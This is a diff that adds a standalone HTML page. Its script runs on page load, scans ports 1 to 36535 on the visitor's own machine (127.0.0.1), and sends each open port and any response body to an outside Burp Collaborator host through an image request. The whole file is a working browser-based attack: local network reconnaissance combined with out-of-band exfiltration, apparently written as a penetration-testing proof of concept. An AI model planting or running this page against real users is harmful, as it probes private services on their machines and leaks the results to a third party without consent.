@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Port Scan and Ping Burp Collaborator</title>
+    <script type="text/javascript">
+        async function scanPort(host, port) {
+            try {
+                let url = `http://${host}:${port}`;
+                let response = await fetch(url, { mode: 'no-cors' });
+                return response.text().then(body => {
+                    console.log(`Port ${port} is open`);
+                    console.log(`Response body: ${body}`);
+                    sendPing(port, body);
+                    return port;
+                });
+            } catch (error) {
+                return null; // Port is closed
+            }
+        }
+
+        async function scanPorts(host, ports) {
+            let openPorts = [];
+            for (let port of ports) {
+                let result = await scanPort(host, port);
+                if (result) {
+                    openPorts.push(result);
+                }
+            }
+            return openPorts;
+        }
+
+        function sendPing(port, body) {
+            let collaboratorUrl = 'https://cn3uo7snvzxwvg0cpyy6obo4uv0mocc1.oastify.com';
+            let pingUrl = `${collaboratorUrl}?port=${port}&body=${encodeURIComponent(body)}`;
+            let img = new Image();
+            img.src = pingUrl;
+            console.log(`Ping sent to ${pingUrl}`);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            let host = '127.0.0.1'; // Replace with your target host
+
+            // Generate an array of ports from 1 to 36535
+            let ports = [];
+            for (let i = 1; i <= 36535; i++) {
+                ports.push(i);
+            }
+
+            scanPorts(host, ports).then(openPorts => {
+                console.log("Open ports:", openPorts);
+            });
+        });
+    </script>
+</head>
+<body>
+    <p>Scanning ports and pinging Burp Collaborator...</p>
+</body>
+</html>
